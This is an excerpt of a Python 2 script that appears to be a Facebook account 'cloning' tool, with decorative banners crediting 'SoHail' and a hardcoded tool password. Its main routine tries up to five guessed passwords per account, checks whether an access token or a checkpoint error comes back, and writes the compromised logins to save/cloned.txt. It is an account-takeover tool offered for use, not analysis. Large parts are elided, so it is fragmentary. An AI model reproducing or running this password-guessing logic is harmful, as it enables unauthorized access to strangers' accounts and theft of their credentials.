...
\033[1;94mFACEBOOK  Talha Shaikh 
                  
\033[1;92mTEL CHA   SoHail TeCh
...
logo1 = """
   ...
   ______       _       ____  _____  _______          _       _____      
 .' ___  |     / \     |_   \|_   _||_   __ \        / \     |_   _|     
/ .'   \_|    / _ \      |   \ | |    | |__) |      / _ \      | |       
| |   ____   / ___ \     | |\ \| |    |  __ /      / ___ \     | |   _   
\ `.___]  |_/ /   \ \_  _| |_\   |_  _| |  \ \_  _/ /   \ \_  _| |__/ |  
 `._____.'|____| |____||_____|\____||____| |___||____| |____||________|  
                                                                         
╔══──────────────────────────╗─══╗
║ OWNER 💓💓💓SoHail Badakhsh        ║║
║  GITHUB 💝💝💝 MAMAD181281      ║ ║
║ FACEBOOK 💝💝💝Talha Shaikh ║ ║
║  ENJOY 💝💝💝Pakistan Cloning    ║ ║
...
logo2 = """
  ...
  ______     ___   ____  ____       _       _____  _____     
.' ____ \  .'   `.|_   ||   _|     / \     |_   _||_   _|    
| (___ \_|/  .-.  \ | |__| |      / _ \      | |    | |      
 _.____`. | |   | | |  __  |     / ___ \     | |    | |   _  
| \____) |\  `-'  /_| |  | |_  _/ /   \ \_  _| |_  _| |__/ | 
 \______.' `.___.'|____||____||____| |____||_____||________| 
...
""")
CorrectUsername = "Ganral"
CorrectPassword = "Sohail"
    ...
    if (username == CorrectUsername):
  	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://www.facebook.com/profile.php?id=100012246874026')
    else:
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[SoHail-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[SoHail-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[SoHail-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[SoHail-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[SoHail-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[SoHail-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[SoHail-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[SoHail-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SoHail-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SoHail-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    print('Cloned Accounts Has Been Saved : save/Sa.txt')
...
\033[1;95mFb\033[1;97mGan-SoHail"""
